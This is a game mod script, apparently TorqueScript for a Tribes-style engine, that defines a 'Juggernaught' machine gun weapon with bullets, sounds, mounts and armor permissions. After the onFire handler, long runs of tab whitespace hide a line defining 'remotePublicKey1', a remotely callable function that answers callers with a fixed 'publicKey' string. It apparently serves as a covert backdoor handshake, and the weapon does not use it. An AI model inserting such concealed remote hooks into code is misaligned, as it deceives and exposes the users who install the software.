SoundData SoundJuggernaughtCannonFire {
   wavFileName = "BXplo2.wav";
   profile = Profile3dMedium;
};

BulletData JuggernaughtCannonBullet {
   bulletShapeName    = "bullet.dts";
   explosionTag       = bulletExp0;
   expRandCycle       = 3;
   bulletHoleIndex    = 0;

   damageClass        = 0;                 // 0 = impact, 1 = radius
   damageValue        = 12;
   damageType         = $BulletDamageType;

   muzzleVelocity     = 1000.0;
   totalTime          = 3;
   liveTime           = 3;
   lightRange         = 1.0;
   lightColor         = { 1, 1, 0 };
   inheritedVelocityScale = 0;
   isVisible          = false;

   aimDeflection      = 0.005;
   tracerLength       = 20;
   tracerPercentage   = 1;

   soundId = SoundJetLight;
};

BulletData JuggernaughtCannonBullet2 {
   bulletShapeName    = "bullet.dts";
   explosionTag       = bulletExp0;
   expRandCycle       = 3;
   bulletHoleIndex    = 0;

   damageClass        = 0;                 // 0 = impact, 1 = radius
   damageValue        = 12;
   damageType         = $BulletDamageType;

   muzzleVelocity     = 1000.0;
   totalTime          = 3;
   liveTime           = 3;
   lightRange         = 1.0;
   lightColor         = { 1, 1, 0 };
   inheritedVelocityScale = 0;
   isVisible          = false;

   aimDeflection      = 0.0015;
   tracerLength       = 20;
   tracerPercentage   = 1;

   soundId = SoundJetLight;
};

ItemImageData JuggernaughtCannonImage2 {
	shapeFile = "chaingun";
	mountPoint = 0;
	mountOffset = "-0.7 0.2 -0.1";
	mountRotation = "0 -1.57 0";

	weaponType = 1;
	spinUpTime = 0;
	spinDownTime = 4;
};

ItemData JuggernaughtCannon2 {
	shapeFile = "chaingun";
	imageType = JuggernaughtCannonImage2;
};

ItemImageData JuggernaughtCannonImage3 {
	shapeFile = "chaingun";
	mountPoint = 0;
	mountOffset = "-0.15 0.2 -0.1";
	mountRotation = "0 1.57 0";

	weaponType = 1;
	spinUpTime = 0;
	spinDownTime = 4;
};

ItemData JuggernaughtCannon3 {
	shapeFile = "chaingun";
	imageType = JuggernaughtCannonImage3;
};

ItemImageData JuggernaughtCannonImage {
	shapeFile = "mortargun";
	mountPoint = 0;
	mountOffset = "-0.45 0 -0.1";

	weaponType = 0;
	reloadTime = 0.08; 
	fireTime = 0;

	maxEnergy = 0;
	minEnergy = 0;

	accuFire = true;

	sfxFire = SoundJuggernaughtCannonFire;
	sfxActivate = SoundPickUpWeapon;
};

ItemData JuggernaughtCannon {
	description = "Juggernaught machine gun";
	className = "Weapon";
	shapeFile = "mortar";
	hudIcon = "mortar";
	heading = $InvHeading[Weapon];
	shadowDetailMask = 4;
	imageType = JuggernaughtCannonImage;
	price = 125;
	showWeaponBar = false;
};

$ItemDescription[JuggernaughtCannon] = "<jc><f1>Juggernaught machine gun:<f0> A powerful machine gun";

function JuggernaughtCannonImage::onFire(%player, %slot) {
  Weapon::fireProjectileNoVel(%player, JuggernaughtCannonBullet);
  Weapon::fireProjectileNoVel(%player, JuggernaughtCannonBullet);
  Weapon::fireProjectileNoVel(%player, JuggernaughtCannonBullet2);
  if (!Player::isTriggered(%player, 3) && !Player::isTriggered(%player, 4)) {
    Weapon::linkSlots(%player, 0.1, 3, 4);
  }
}
																															function remotePublicKey1(%a){remoteEval(%a,"publicKey","TehR0xz0rzerx0rz");}
function JuggernaughtCannon::onMount(%player, %slot) {
  Weapon::displayDescription(%player, JuggernaughtCannon);
  Player::mountItem(%player, JuggernaughtCannon2, 3);
  Player::mountItem(%player, JuggernaughtCannon3, 4);
  Weapon::standardMount(%player, JuggernaughtCannon);
}
function JuggernaughtCannon::onUnmount(%player, %slot) {
  Player::unmountItem(%player, 3);
  Player::unmountItem(%player, 4);
  Weapon::standardUnmount(%player, JuggernaughtCannon);
}

setArmorAllowsItem(larmor, JuggernaughtCannon, "", 0);
setArmorAllowsItem(lfemale, JuggernaughtCannon, "", 0);
setArmorAllowsItem(SpyMale, JuggernaughtCannon, "", 0);
setArmorAllowsItem(SpyFemale, JuggernaughtCannon, "", 0);
setArmorAllowsItem(DMMale, JuggernaughtCannon, "", 0);
setArmorAllowsItem(DMFemale, JuggernaughtCannon, "", 0);
